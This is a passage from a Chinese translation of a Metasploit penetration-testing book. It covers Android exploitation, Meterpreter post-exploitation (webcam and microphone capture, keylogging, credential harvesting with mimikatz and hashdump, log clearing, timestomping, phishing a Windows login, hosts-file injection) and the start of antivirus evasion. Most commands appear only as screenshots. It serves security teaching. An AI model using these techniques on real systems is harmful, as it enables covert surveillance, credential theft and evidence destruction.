![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/16336ba2-8434-4dcb-9f86-0743f0c1c8d1.png)

我们可以使用`send_sms`命令从被利用手机向任何号码发送短信。让我们看看消息是否已发送：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/d515fdf6-33e4-4bac-9c00-0d68772e17e1.png)

哎呀！消息已成功传递。同时，让我们看看使用`sysinfo`命令我们侵入了哪个系统：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/a68d758a-139e-4f60-871b-4ba04ae54042.png)

让我们对手机进行地理定位：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/57c4bd84-9e55-4cd6-8957-60ff7555654a.png)

浏览到 Google Maps 链接，我们可以得到手机的确切位置：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/0879a63b-aed1-4a9b-aa99-f640e3435960.png)

让我们用被利用手机的摄像头拍几张照片：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/64f00608-de17-4222-8901-45ca7e320564.png)

我们可以看到我们从相机得到了图片。让我们查看这张图片：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/51d63ae1-66b8-43d9-b720-714248135412.png)

# 总结和练习

本章介绍了一种实用的基于客户端的利用方法。学习基于客户端的利用将使渗透测试人员更容易进行内部审计，或者在内部攻击比外部攻击更具影响力的情况下进行操作。

在本章中，我们研究了各种技术，可以帮助我们攻击基于客户端的系统。我们研究了基于浏览器的利用及其变种。我们利用 Arduino 攻击了基于 Windows 的系统。我们学习了如何创建各种基于文件格式的利用，以及如何使用 Metasploit 进行 DNS 欺骗攻击。最后，我们还学习了如何利用 Android 设备。

您可以随意进行以下练习，以提高您的技能：

+   尝试使用 BetterCAP 执行 DNS 欺骗练习

+   从 Metasploit 生成 PDF 和 Word 利用文档，并尝试规避签名检测

+   尝试将生成的 Android APK 与其他合法 APK 绑定

在下一章中，我们将详细介绍后期利用。我们将介绍一些高级的后期利用模块，这些模块将允许我们从目标系统中收集大量有用的信息。


# 第十八章：Metasploit 扩展

本章将涵盖 Metasploit 的扩展用法和核心后渗透功能。在本章中，我们将专注于后渗透的开箱即用方法，并将涵盖繁琐的任务，如提权、获取明文密码、查找有价值的信息等。

在本章中，我们将涵盖和理解以下关键方面：

+   使用高级后渗透模块

+   使用自动化脚本加速渗透测试

+   提权

+   从内存中找到密码

现在让我们进入 Metasploit 的后渗透功能，并从下一节开始学习基础知识。

# Metasploit 的后渗透基础

在之前的章节中，我们已经涵盖了许多后渗透模块和脚本。在本章中，我们将专注于之前未包括的功能。所以，让我们从下一节中开始使用后渗透中最基本的命令。

# 基本后渗透命令

核心 Meterpreter 命令提供了大多数被利用系统上可用的基本后渗透功能。让我们从一些最基本的命令开始，这些命令有助于后渗透。

# 帮助菜单

我们可以随时参考帮助菜单，通过发出`help`或`?`命令来列出在目标上可用的各种命令，如下面的截图所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/a4fcbe96-4d90-4a61-a0fc-8dfe18839536.png)

# 后台命令

在进行后渗透时，我们可能会遇到需要执行其他任务的情况，比如测试不同的漏洞利用，或者运行提权漏洞利用。在这种情况下，我们需要将当前的 Meterpreter 会话放到后台。我们可以通过发出`background`命令来做到这一点，如下面的截图所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/70a3bdcc-dd91-4991-ac83-8b33abcfca26.png)

我们可以看到在前面的截图中，我们成功地将会话放到后台，并使用`sessions -i`命令重新与会话交互，后面跟着会话标识符，即前面截图中的`1`。

# 从通道中读取

Meterpreter 通过多个通道与目标进行交互。在进行后渗透时，我们可能需要列出并从特定通道读取。我们可以通过发出`channel`命令来做到这一点，如下所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/0a766419-c1ba-4172-9a22-9994b9755d42.png)

在前面的截图中，我们通过发出`channel -l`命令列出了所有可用的通道。我们可以通过发出`channel -r [channel-id]`来读取一个通道。通道子系统允许通过 Meterpreter shell 作为通信子通道存在的所有逻辑通道进行读取、列出和写入。

# 文件操作命令

我们在之前的章节中涵盖了一些文件操作。让我们复习一下一些文件操作命令，比如`pwd`。使用`pwd`命令，我们可以查看当前目录，如下面的截图所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/d0b489dc-ff22-4b63-b7a1-cceb4b4c5910.png)

此外，我们可以使用`cd`命令浏览目标文件系统，并使用`mkdir`命令创建目录，如下面的截图所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/a28c5146-202d-4a15-adef-7ff2ebfd597a.png)

Meterpreter shell 允许我们使用`upload`命令将文件上传到目标系统。让我们看看它是如何工作的：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/443076ec-30ca-42f0-8a2a-ed7aa7f07248.png)

我们可以通过发出`edit`命令后跟文件名来编辑目标上的任何文件，如下所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/c2d0a2ad-c18f-4098-97ec-ee54ff6c4fe2.png)

现在让我们通过发出`cat`命令来查看文件的内容：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/dd284c93-8114-46b9-9b30-ded5be62b877.png)

我们可以使用`ls`命令列出目录中的所有文件，如下所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/81cd0b2e-60a6-44e4-b33b-9b6bcd61b0ba.png)

我们可以使用`rmdir`命令从目标中删除特定目录，使用`rm`命令删除文件，如下所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/654088e5-a2a3-4fbb-bafa-6f279cdefe6b.png)

此外，我们可以使用`download`命令从目标下载文件，如下所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/a00d089d-188d-469d-b70a-029fe54f30f8.png)

# 桌面命令

Metasploit 具有枚举桌面、使用网络摄像头拍照、录制麦克风声音、流式传输摄像头等桌面命令。让我们看看这些功能：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/6bf5748e-803b-4795-81d3-d79def888efc.png)

使用`enumdesktops`和`getdesktop`可以获取与目标桌面相关的信息。`enumdesktop`命令列出所有可用的桌面，而`getdesktop`列出与当前桌面相关的信息。

# 屏幕截图和摄像头枚举

在进行屏幕截图、摄像头拍摄、运行实时流或记录按键之前，测试人员必须事先获得许可。然而，我们可以使用`snapshot`命令拍摄目标的桌面快照，如下所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/e05c7cf8-bc4c-4bc9-8024-9a8ea9dfd1d9.png)

查看保存的 JPEG 文件，我们有：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/32e72209-18bb-486a-ad64-9ec15725c418.png)

让我们看看是否可以枚举摄像头并查看谁正在系统上工作：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/d6899588-d2a7-411f-bb02-2cf25f3e6119.png)

使用`webcam_list`命令，我们可以找出与目标关联的摄像头数量。让我们使用以下`webcam_stream`命令来流式传输摄像头：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/ab6b0917-a7e9-4610-88c1-53a37ee1c199.png)

发出上述命令会在浏览器中打开一个网络摄像头流，如下截图所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/e1e6e105-6734-4e13-a83b-6104cb44f406.png)

我们还可以选择快照而不是流式传输，通过发出以下`webcam_snap`命令：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/c5600898-9c41-403f-9a54-a7909966cd73.png)

有时，我们需要监听环境进行监视。为了实现这一点，我们可以使用`record_mic`命令，如下所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/bc725fed-cd3a-44b3-a574-0cff3a635cb6.png)

我们可以使用`record_mic`命令设置捕获持续时间，通过使用`-d`开关传递秒数。

另一个很棒的功能是查找空闲时间以了解使用时间线，并在目标机器上的用户较不活跃时攻击系统。我们可以使用`idletime`命令来实现这一点，如下截图所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/ffddb760-3c26-49c9-9ec9-2dac7cfad893.png)

从目标获取的其他有趣信息是**按键记录**。我们可以通过发出`keyscan_start`命令启动键盘嗅探模块来转储按键记录，如下所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/6f2c1124-70ea-42e0-8eb9-8b4d3c307af6.png)

几秒钟后，我们可以使用`keyscan_dump`命令转储按键记录，如下所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/41fe6e25-60e9-415f-87f1-40c840d2701f.png)

在本节中，我们已经看到了许多命令。现在让我们继续进行后期利用的高级部分。

# 使用 Metasploit 进行高级后期利用

在本节中，我们将利用从主要命令中收集的信息来取得进一步的成功并访问目标的级别。

# 获取系统权限

如果我们侵入的应用程序以管理员权限运行，通过发出`getsystem`命令轻松获得系统级权限，如下截图所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/ebf35d62-73ba-45f8-b7ea-9c4b5f36a044.png)

系统级权限提供了最高级别的权限，能够在目标系统上执行几乎任何操作。

在较新版本的 Windows 上，`getsystem`模块并不是很可靠。建议尝试本地权限提升方法和模块来提升权限。

# 使用 timestomp 更改访问、修改和创建时间

Metasploit 被广泛应用，从私人组织到执法部门。因此，在进行隐秘行动时，强烈建议更改文件的访问、修改或创建时间。我们可以使用`timestomp`命令来更改文件的时间和日期。在前面的部分中，我们创建了一个名为`creditcard.txt`的文件。让我们使用`timestomp`命令更改其时间属性，如下所示：

！[](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/7e4b3834-1676-4654-a95c-f6d41ee9cc20.png)

我们可以看到访问时间是`2016-06-19 23:23:15`。我们可以使用`-z`开关将其修改为`1999-11-26 15:15:25`，如前面的截图所示。让我们看看文件是否被正确修改了：

！[](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/f5dc327e-4a6a-4b0c-ab46-59ac669d06b5.png)

我们成功地改变了`creditcard.txt`文件的时间戳。我们还可以使用`-b`开关来清除文件的所有时间细节，如下所示：

！[](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/e9894411-9156-4a83-ad23-617ff91aa4c6.png)

通过使用`timestomp`，我们可以单独更改修改、访问和创建时间。

# 其他后渗透模块

Metasploit 提供了 250 多个后渗透模块；但是，我们只会介绍一些有趣的模块，其余的留给你作为练习。

# 使用 Metasploit 收集无线 SSID

可以使用`wlan_bss_list`模块有效地发现目标系统周围的无线网络。该模块允许我们对目标周围的 Wi-Fi 网络的位置和其他必要信息进行指纹识别，如下图所示：

！[](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/6841ec66-4ec0-4787-8147-c8e3a0bbe904.png)

# 使用 Metasploit 收集 Wi-Fi 密码

与前面的模块类似，我们还有`wlan_profile`模块，它可以收集目标系统中保存的所有 Wi-Fi 凭据。我们可以使用该模块如下：

！[](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/98437bb3-1d01-483f-b071-d2852096ff46.png)

我们可以在前面的截图中看到网络的名称在`<name>`标签中，密码在`<keyMaterial>`标签中。

# 获取应用程序列表

Metasploit 提供了各种类型应用程序的凭证收集器；但是，要找出目标上安装了哪些应用程序，我们需要使用`get_application_list`模块获取应用程序列表，如下所示：

！[](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/525ef5c8-2200-462c-9152-41409accf66b.png)

找出应用程序后，我们可以在目标上运行各种信息收集模块。

# 收集 Skype 密码

假设我们发现目标系统正在运行 Skype。Metasploit 提供了一个很好的模块，可以使用`skype`模块获取 Skype 密码：

！[](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/94bd060a-827d-4dd3-bc3e-7958d15de06f.png)

# 收集 USB 历史

Metasploit 具有 USB 历史恢复模块，可以找出目标系统上使用过哪些 USB 设备。该模块在 USB 保护设置的情况下非常方便，只允许连接特定设备。使用该模块可以更轻松地欺骗 USB 描述符和硬件 ID。

有关欺骗 USB 描述符和绕过端点保护的更多信息，请参阅[`www.slideshare.net/the_netlocksmith/defcon-2012-hacking-using-usb-devices`](https://www.slideshare.net/the_netlocksmith/defcon-2012-hacking-using-usb-devices)。

让我们看看如何使用该模块：

！[](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/8dfbd30f-6b8a-4e93-bd04-c06fbfe9fb74.png)

# 使用 Metasploit 搜索文件

Metasploit 提供了一个很酷的命令来搜索有趣的文件，可以进一步下载。我们可以使用`search`命令列出所有具有特定文件扩展名的文件，例如`*.doc`、`*.xls`等，如下所示：

！[](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/0e091a3c-a77c-4b41-8f30-20f9d7604e1c.png)

# 使用`clearev`命令从目标中清除日志

可以使用`clearev`命令清除目标系统的所有日志：

！[](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/0affc886-7466-46f4-85e0-52cf1206aac5.png)

然而，如果你不是执法人员，你不应该清除目标的日志，因为日志为蓝队提供了重要信息，以加强他们的防御。另一个用于处理日志的优秀模块，称为`event_manager`，存在于 Metasploit 中，并且可以如下截图所示使用：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/ae0e6e98-3c17-4fb7-a66a-ceac56003dff.png)

让我们在下一节中深入了解 Metasploit 的高级扩展功能。

# Metasploit 的高级扩展功能

在本章中，我们已经涵盖了许多后渗透技术。现在让我们在本节中介绍一些 Metasploit 的高级功能。

# 使用 pushm 和 popm 命令

Metasploit 提供了两个很棒的命令，`pushm`和`popm`。`pushm`命令将当前模块推送到模块堆栈上，而`popm`则从模块堆栈顶部弹出推送的模块；然而，这不是进程可用的标准堆栈。相反，这是 Metasploit 利用相同概念，但与之无关。使用这些命令的优势是快速操作，节省了大量时间和精力。

考虑这样一个场景，我们正在测试一个具有多个漏洞的内部服务器。在内部网络的每台计算机上都运行着两个可利用的服务。为了利用每台机器上的两个服务，我们需要在两个漏洞之间快速切换模块的机制，而不离开选项。在这种情况下，我们可以使用`pushm`和`popm`命令。我们可以使用一个模块测试服务器的单个漏洞，然后可以将模块推送到堆栈上并加载另一个模块。完成第二个模块的任务后，我们可以使用`popm`命令从堆栈中弹出第一个模块，所有选项都保持不变。

让我们通过下面的截图了解更多关于这个概念：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/3ca2192e-6b8e-4657-a229-1533997c4f12.png)

在上面的截图中，我们可以看到我们使用`pushm`命令将`psexec`模块推送到堆栈上，并加载了`exploit/multi/handler`模块。一旦我们完成了`multi/handler`模块的操作，我们可以使用`popm`命令从堆栈中重新加载`psexec`模块，如下图所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/9dc88576-e245-4778-a707-abe9db238ebe.png)

我们可以看到`psexec`模块的所有选项都被保存了，堆栈上的模块也是如此。因此，我们不需要再次设置选项。

# 利用重新加载、编辑和重新加载所有命令加快开发速度

在模块的开发阶段，我们可能需要多次测试一个模块。每次对新模块进行更改时都关闭 Metasploit 是一项繁琐、令人厌倦和耗时的任务。必须有一种机制使模块开发变得简单、快捷和有趣。幸运的是，Metasploit 提供了`reload`、`edit`和`reload_all`命令，使模块开发者的生活相对容易。我们可以使用`edit`命令即时编辑任何 Metasploit 模块，并使用`reload`命令重新加载编辑后的模块，而无需关闭 Metasploit。如果对多个模块进行了更改，我们可以使用`reload_all`命令一次重新加载所有 Metasploit 模块。

让我们看一个例子：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/58ff579f-e73e-451a-9458-e6adedda87ae.png)

在上面的截图中，我们正在编辑`exploit/windows/ftp`目录中的`freefloatftp_user.rb`漏洞，因为我们发出了`edit`命令。我们将有效载荷大小从`444`更改为`448`，并保存了文件。接下来，我们需要发出`reload`命令来更新 Metasploit 中模块的源代码，如下图所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/045e9bfd-2c9c-421c-b1ed-26b8436fe2b6.png)

使用`reload`命令，我们消除了在开发新模块时重新启动 Metasploit 的需要。

`edit`命令在 vi 编辑器中启动 Metasploit 模块进行编辑。在[`www.tutorialspoint.com/unix/unix-vi-editor.htm`](http://www.tutorialspoint.com/unix/unix-vi-editor.htm)了解更多关于 vi 编辑器命令的信息。

# 利用资源脚本

Metasploit 通过资源脚本提供自动化。资源脚本通过自动设置一切来消除手动设置选项的任务，从而节省了设置模块和有效载荷选项所需的时间。

创建资源脚本有两种方法：一种是手动创建脚本，另一种是使用`makerc`命令。我建议使用`makerc`命令而不是手动编写脚本，因为它可以消除打字错误。`makerc`命令会将之前输入的所有命令保存在一个文件中，该文件可以与`resource`命令一起使用。让我们看一个例子：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/c63d7b93-6767-48e3-b5c5-48c735fd7ae3.png)

我们可以看到，在前面的截图中，我们通过设置相关有效载荷和选项（如`LHOST`和`LPORT`）来启动了一个利用处理程序模块。发出`makerc`命令将系统地将所有这些命令保存到我们选择的文件中，本例中为`multi_hand`。我们可以看到，`makerc`成功地将最后六个命令保存到`multi_hand`资源文件中。让我们按以下方式使用资源脚本：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/af00fb54-a71d-4baf-8647-46bd7d2af595.png)

我们可以看到，只需发出`resource`命令，然后跟上我们的脚本，它就会自动复制我们保存的所有命令，从而消除了重复设置选项的任务。

# 在 Metasploit 中使用 AutoRunScript

Metasploit 还提供了使用`AutoRunScript`的另一个很棒的功能。`AutoRunScript`选项可以通过发出`show advanced`命令来填充。`AutoRunScript`可以自动执行后渗透，并在获得对目标的访问后执行。我们可以通过发出`set AutoRunScript [script-name]`命令手动设置`AutoRunScript`选项，或者在资源脚本本身中设置，从而自动化利用和后渗透。

`AutoRunScript`也可以通过使用`multi_script`和`multi_console_command`模块运行多个后渗透脚本。让我们以一个例子来说明，其中有两个脚本，一个用于自动化利用，另一个用于自动化后渗透，如下面的截图所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/97a51a26-82ea-4e0c-bcec-62818316faf0.png)

这是一个小的后渗透脚本，自动化了`checkvm`（用于检查目标是否在虚拟环境中运行的模块）和`migrate`（帮助从被利用的进程迁移到更安全的进程的模块）。让我们来看一下利用脚本：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/c33ec025-632f-44b9-a8cf-36d5442a61c5.png)

前面的资源脚本通过设置所有必需的参数来自动化 HFS 文件服务器的利用。我们还使用`multi_console_command`选项设置了`AutoRunScript`选项，该选项允许执行多个后渗透脚本。我们使用`-rc`开关将后渗透脚本定义为`multi_console_command`，如前面的截图所示。

让我们运行利用脚本，并在下面的截图中分析其结果：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/536bfcae-84f4-4dcc-8f56-1a4ac1bf57e8.png)

我们可以看到，在利用完成后不久，执行了`checkvm`和`migrate`模块，这表明目标是`Sun VirtualBox Virtual Machine`，并且进程已迁移到`notepad.exe`。我们可以在输出的剩余部分中看到脚本的成功执行：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/b761b85f-fabb-4ccf-ade2-965f6d6cd7b9.png)

我们成功迁移到了`notepad.exe`进程；但是，如果有多个`notepad.exe`实例，进程迁移也可能跳过其他进程。

# 在 AutoRunScript 选项中使用 multiscript 模块

我们还可以使用`multiscript`模块代替`multi_console_command`模块。让我们创建一个新的后渗透脚本，如下所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/ece24491-5185-4601-af5a-81b4b6c9f739.png)

正如我们在前面的屏幕截图中所看到的，我们创建了一个名为`multi_scr.rc`的新后渗透脚本。我们需要对我们的利用脚本进行更改以适应这些更改，如下所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/8bf54c36-68fc-4fe1-ad9b-73ed3593cd2c.png)

我们仅仅用`multiscript`替换了`multi_console_command`，并更新了我们的后渗透脚本的路径，如前面的屏幕截图所示。让我们看看当我们运行`exploit`脚本时会发生什么：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/16b2b873-b862-4aff-9cc1-182325892a17.png)

我们可以看到，在获得对目标的访问权限之后，`checkvm`模块被执行，然后是`migrate`、`get_env`和`event_manager`命令，如下面的屏幕截图所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/d68f52d2-70fb-443a-9aa0-e7fe512decc9.png)

`event_manager`模块显示了来自目标系统的所有日志，因为我们在我们的资源脚本中使用了`-i`开关。`event_manager`命令的结果如下：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/5c58aa65-de2b-4411-a9f1-ed0dd9bc8048.png)

# 使用 Metasploit 进行权限提升

在渗透测试中，我们经常遇到有限的访问权限的情况，如果我们运行诸如`hashdump`之类的命令，可能会出现以下错误：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/4d754ab2-cdb9-472a-a892-e045ad18b44c.png)

在这种情况下，如果我们尝试使用`getsystem`命令获取系统权限，我们会得到以下错误：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/eefae71d-7266-45e2-885d-71f47fe7f14f.png)

那么，在这种情况下我们该怎么办呢？答案是使用后渗透来提升权限，以实现最高级别的访问。以下演示是在 Windows Server 2008 SP1 操作系统上进行的，我们使用本地漏洞来绕过限制并完全访问目标：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/db955683-4dc3-4d9b-9bca-ee4737b3226b.png)

在前面的屏幕截图中，我们使用了`exploit/windows/local/ms10_015_kitrap0d`漏洞来提升权限，并获得了最高级别的访问权限。让我们使用`getuid`命令来检查访问级别：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/c2839884-d17f-4473-9835-6add414c3f6c.png)

现在，我们可以看到我们已经具有系统级别的访问权限，并且现在可以在目标上执行任何操作。

有关 KiTrap0D 漏洞的更多信息，请参阅[`docs.microsoft.com/en-us/security-updates/SecurityBulletins/2010/ms10-015`](https://docs.microsoft.com/en-us/security-updates/SecurityBulletins/2010/ms10-015)。

现在让我们运行`hashdump`命令，并检查它是否有效：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/c6748078-134a-4bb3-a641-b295ae2e7671.png)

太棒了！我们轻松地得到了哈希值。

# 使用 mimikatz 在明文中查找密码

**mimikatz**是 Metasploit 的一个很好的补充，可以从 lsass 服务中以明文形式恢复密码。我们已经使用了通过传递哈希攻击来使用哈希值；然而，有时也可能需要密码来节省时间，以及用于 HTTP 基本身份验证的使用，后者需要对方知道密码而不是哈希值。

可以使用 Metasploit 中的`load mimikatz`命令加载 mimikatz。可以使用 mimikatz 模块提供的`kerberos`命令来查找密码：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/fbb58de2-f09d-4d25-96f6-703dd8a8f21a.png)

# 使用 Metasploit 嗅探流量

是的，Metasploit 确实提供了从目标主机嗅探流量的功能。我们不仅可以嗅探特定接口，还可以嗅探目标上的任何指定接口。要运行此模块，我们首先需要列出所有接口，并在其中选择任何一个：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/b5f859bb-2615-437e-8cbb-9a7b2e5b07e2.png)

我们可以看到我们有多个接口。让我们开始在无线接口上进行嗅探，该接口被分配为 ID`2`，如下面的屏幕截图所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/f287b005-361a-4791-b6d4-2607c6775669.png)

我们通过在无线接口上使用 ID 为`2`的`sniffer_start`命令和`1000`数据包作为缓冲区大小来启动嗅探器。通过发出`sniffer_dump`命令，我们成功下载了 PCAP。让我们看看通过在 Wireshark 中启动捕获的 PCAP 文件来收集了什么数据。我们可以通过发出以下命令来做到这一点：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/a94dc1c9-588d-485f-b232-e113c4b652e8.png)

我们可以在 PCAP 文件中看到各种数据，包括 DNS 查询、HTTP 请求和明文密码：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/d2994157-6e20-4ca5-8716-325633b3dd92.png)

# 使用 Metasploit 进行 host 文件注入

我们可以通过注入 host 文件对目标进行各种钓鱼攻击。我们可以为特定域添加 host 文件条目，从而轻松利用我们的钓鱼攻击。

让我们看看如何使用 Metasploit 进行 host 文件注入：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/3052c857-2477-463a-b014-3318fe8201ff.png)

我们可以看到我们在`SESSION 1`上使用了`post/windows/manage/inject_host`模块，并将条目插入了目标的 host 文件。让我们看看当目标打开[`www.yahoo.com/`](https://www.yahoo.com/)时会发生什么：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/5c1a3514-af96-45ad-aa98-357832081bb6.png)

我们可以看到目标被重定向到我们的恶意服务器，这可以轻松地托管钓鱼页面。

# 钓取 Windows 登录密码

Metasploit 包括一个可以钓取登录密码的模块。它生成一个类似于真实 Windows 弹出窗口的登录弹出窗口，可以收集凭据，由于它伪装成合法的登录，用户被迫填写凭据，然后继续进行此操作。我们可以通过运行`post/windows/gather/phish_login_pass`来钓取用户的登录。一旦我们运行这个模块，假的登录框就会在目标处弹出，如下面的屏幕截图所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/eb87be4a-7342-4df6-bfde-56d761df3ae2.png)

一旦目标填写凭据，我们将以纯文本形式提供凭据，如下面的屏幕截图所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/2da7e422-f896-4e66-82e9-1e209329ba2f.png)

哇！我们轻松地获得了凭据。正如我们在本章中所看到的，Metasploit 通过与独立工具（如 mimikatz 和本地脚本）合作，为后渗透提供了大量出色的功能。

# 总结和练习

在本章中，我们详细介绍了后渗透。我们从基本到高级的后渗透场景进行了讨论。我们还研究了在 Windows 环境中的特权升级以及其他一些高级技术。

以下是你应该自己尝试的练习：

+   为那些 Metasploit 中尚不存在的功能开发自己的后渗透模块

+   开发自动化脚本以获取访问权限、保持访问权限和清除痕迹。

+   尝试为基于 Linux 的操作系统贡献至少一个 Metasploit 的后渗透模块

在下一章中，我们将利用本章中涵盖的大部分后渗透技巧来规避和逃避目标系统的保护。我们将执行一些最尖端的 Metasploit Kung Fu，并尝试击败杀毒软件和防火墙。


# 第十九章：Metasploit 的逃避

在过去的八章中，我们已经涵盖了渗透测试的主要阶段。在本章中，我们将包括渗透测试人员在现实场景中可能遇到的问题。过去的简单攻击可以在 Metasploit 中弹出一个 shell 的日子已经一去不复返。随着攻击面的增加，安全视角也逐渐增加。因此，需要巧妙的机制来规避各种性质的安全控制。在本章中，我们将探讨可以防止部署在目标端点的安全控制的不同方法和技术。在本章的整个过程中，我们将涵盖：

+   绕过 AV 检测 Meterpreter 负载

+   绕过 IDS 系统

+   绕过防火墙和被阻止的端口

所以，让我们开始逃避技术。

# 使用 C 封装和自定义编码器规避 Meterpreter

Meterpreter 是安全研究人员使用最广泛的负载之一。然而，由于其流行，大多数 AV 解决方案都会检测到它，并很快被标记。让我们使用 `msfvenom` 生成一个简单的 Metasploit 可执行文件，如下所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/5ddba1a4-be28-4168-a7c0-8a0d8ba862bf.png)

我们使用 `msfvenom` 命令创建了一个简单的反向 TCP Meterpreter 可执行后门。此外，我们已经提到了 `LHOST` 和 `LPORT`，然后是格式，即 PE/COFF 可执行文件的 EXE。我们还通过使用 `-b` 开关来防止空字符、换行和回车坏字符。我们可以看到可执行文件已成功生成。让我们将这个可执行文件移动到 `apache` 文件夹，并尝试在由 Windows Defender 和奇虎 360 杀毒软件保护的 Windows 10 操作系统上下载并执行它。但是，在运行之前，让我们按照以下方式启动匹配处理程序：

